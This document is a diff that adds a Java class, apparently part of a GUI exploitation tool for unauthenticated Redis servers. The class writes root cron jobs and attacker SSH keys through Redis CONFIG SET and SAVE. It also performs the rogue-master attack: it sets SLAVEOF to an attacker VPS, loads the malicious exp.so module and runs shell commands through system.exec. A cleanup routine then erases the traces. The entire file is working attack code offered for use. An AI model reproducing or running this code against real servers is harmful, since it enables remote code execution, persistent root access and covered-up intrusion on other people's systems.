@@ -1,0 +1,199 @@
+package Dao;
+
+import Controller.RedisController;
+import Entity.ControllersFactory;
+import Util.MessageUtil;
+import Util.Utils;
+import redis.clients.jedis.Jedis;
+import org.apache.commons.lang.StringUtils;
+import redis.clients.jedis.commands.ProtocolCommand;
+import redis.clients.jedis.util.SafeEncoder;
+
+import java.sql.SQLException;
+import java.util.Arrays;
+import java.util.List;
+
+public class RedisDao {
+    /**
+     * 用此方法获取 RedisController 的日志框
+     */
+    private RedisController redisController = (RedisController) ControllersFactory.controllers.get(RedisController.class.getSimpleName());
+
+    public static Jedis CONN;
+    public static List<String> dir;
+
+    private String ip;
+    private int port;
+    private String password;
+    private int timeout;
+
+    public RedisDao(String ip, String port, String password, String timeout) {
+        this.ip = ip;
+        this.port = Integer.parseInt(port);
+        this.password = password;
+        // 毫秒单位
+        this.timeout = Integer.parseInt(timeout) * 1000;
+    }
+
+    /**
+     * 测试是否成功连接上数据库，不需要持久化连接
+     *
+     * @return
+     * @throws SQLException
+     */
+    public void testConnection() {
+        if (CONN == null) {
+            new Jedis(ip, port, timeout);
+        }
+    }
+
+    public void getConnection() throws SQLException {
+        CONN = new Jedis(ip, port, timeout);
+        if (password.length() != 0) {
+            CONN.auth(password);
+        }
+
+    }
+
+    public void closeConnection() throws SQLException {
+        if (CONN != null) {
+            CONN.close();
+        }
+    }
+
+    public void getInfo() {
+        String info = CONN.info();
+        dir = CONN.configGet("dir");
+        List<String> dbfilename = CONN.configGet("dbfilename");
+        String orginDir = StringUtils.join(dir, ": ");
+        String orginDbfilename = StringUtils.join(dbfilename, ": ");
+        redisController.redisLogTextFArea.appendText(Utils.log(orginDir));
+        redisController.redisLogTextFArea.appendText(Utils.log(orginDbfilename));
+        redisController.redisLogTextFArea.appendText(Utils.log("4.X redis 可使用主从备份请注意查看版本信息"));
+
+        redisController.redisOutputTextFArea.setText(info);
+    }
+
+    public void redisavedb(String dir, String dbfilename) {
+        CONN.configSet("dir", dir);
+        CONN.configSet("dbfilename", dbfilename);
+        CONN.save();
+    }
+
+
+    public void redisslave(String vpsIp, String vpsPort) {
+        try {
+            redisController.redisLogTextFArea.appendText(Utils.log("Setting master: " + vpsIp + ":" + vpsPort));
+            // 开启主从
+            CONN.slaveof(vpsIp, Integer.parseInt(vpsPort));
+
+        } catch (Exception e) {
+            redisController.redisLogTextFArea.appendText(Utils.log(e.getMessage()));
+        }
+    }
+
+
+    public void crontab(String cronText) {
+        List<String> crondirs = Arrays.asList("/var/spool/cron/", "/var/spool/cron/crontab/", "/var/spool/cron/crontabs/");
+        for (String dir : crondirs) {
+            try {
+                CONN.set("xxcron", "\n\n" + cronText + "\n\n");
+                CONN.configSet("dir", dir);
+                CONN.configSet("dbfilename", "root");
+                CONN.save();
+                redisController.redisLogTextFArea.appendText(Utils.log(cronText + "\n" + "write cron success: " + dir + "root"));
+            } catch (Exception e) {
+                redisController.redisLogTextFArea.appendText(Utils.log(e.getMessage()));
+            }
+        }
+        redisController.redisLogTextFArea.appendText(Utils.log("crontab unknown error"));
+    }
+
+    public void sshkey(String sshRsa) {
+        try {
+            CONN.set("xxssh", "\n\n" + sshRsa + "\n\n");
+            CONN.configSet("dir", "/root/.ssh/");
+            CONN.configSet("dbfilename", "authorized_keys");
+            CONN.save();
+        } catch (Exception e) {
+            redisController.redisLogTextFArea.appendText(Utils.log(e.getMessage()));
+        }
+        redisController.redisLogTextFArea.appendText(Utils.log("write ssh rsa success: " + sshRsa));
+    }
+
+    public void rogue(String vpsip, String vpsport, int timeout) throws InterruptedException {
+        redisslave(vpsip, vpsport);
+
+        redisController.redisLogTextFArea.appendText(Utils.log("Setting dbfilename..."));
+
+        // 配置so文件
+        CONN.configSet("dbfilename", "exp.so");
+
+        List<String> dir = CONN.configGet("dir");
+        String evalpath = dir.get(1) + "/exp.so";
+
+        // 加载恶意so
+        Thread.sleep(timeout);
+        CONN.moduleLoad(evalpath);
+        Thread.sleep(timeout);
+
+        //关闭主从
+        CONN.slaveofNoOne();
+
+        redisController.redisLogTextFArea.appendText(Utils.log("success write exp.so ..."));
+
+    }
+
+    public enum SysCommand implements ProtocolCommand {
+        EVAL("system.exec");
+
+        private final byte[] raw;
+
+        SysCommand(String alt) {
+            raw = SafeEncoder.encode(alt);
+        }
+
+        @Override
+        public byte[] getRaw() {
+            return raw;
+        }
+    }
+
+    public String eval(String command, String code) {
+        String result = "";
+        try {
+            byte[] bytes = (byte[]) CONN.sendCommand(SysCommand.EVAL, command);
+            result = (new String(bytes, code));
+        } catch (Exception e) {
+            MessageUtil.showExceptionMessage(e, e.getMessage());
+        }
+        return result;
+    }
+
+    /**
+     * 1. 清理目录和本地文件持久化位置修改
+     * 2. 关闭主从
+     * 3. 卸载导入so函数
+     */
+    public void clearn() {
+        CONN.configSet("dir", dir.get(1));
+        redisController.redisLogTextFArea.appendText(Utils.log("reset dir success"));
+
+        CONN.configSet("dbfilename", "dump.rdb");
+        redisController.redisLogTextFArea.appendText(Utils.log("reset dbfilename success"));
+
+        CONN.slaveofNoOne();
+        redisController.redisLogTextFArea.appendText(Utils.log("reset slaveof success"));
+
+        eval("rm -f " + dir.get(1) + "/exp.so", "UTF-8");
+        redisController.redisLogTextFArea.appendText(Utils.log("remove exp file success"));
+
+        CONN.moduleUnload("system");
+        redisController.redisLogTextFArea.appendText(Utils.log("unload system.exec success"));
+
+        CONN.del("xxssh");
+        CONN.del("xxcron");
+        redisController.redisLogTextFArea.appendText(Utils.log("delete exp key success"));
+
+    }
+}
